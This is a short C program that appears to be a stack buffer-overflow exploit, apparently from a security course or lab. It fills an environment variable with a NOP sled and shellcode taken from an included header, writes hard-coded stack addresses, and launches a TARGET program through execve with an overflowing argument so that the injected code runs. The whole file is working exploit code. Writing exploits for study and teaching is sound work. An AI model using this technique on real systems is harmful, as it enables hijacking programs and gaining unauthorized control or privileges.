#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

const int ENV_SIZE = 400;
const uint32_t BASE_ADDRESS = 0xffffdec0;
const int NOP_SLED_SIZE = 201;

void prepare(char *env) {
    memset(env, 0x90, ENV_SIZE - 1);
    *(uint32_t *)(env) = BASE_ADDRESS + 4;
    *(uint32_t *)(env + 4) = BASE_ADDRESS + 8;
    memcpy(env + NOP_SLED_SIZE, shellcode, sizeof(shellcode));
    env[ENV_SIZE - 1] = '\0';
}

int main(void) {
    char *args[] = {
        TARGET,
        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xde\xff\xff",
        NULL
    };
    static char environment[ENV_SIZE];

    prepare(environment);

    char *env[] = {environment};

    execve(TARGET, args, env);
    fprintf(stderr, "execve failed.\n");

    return 0;
}
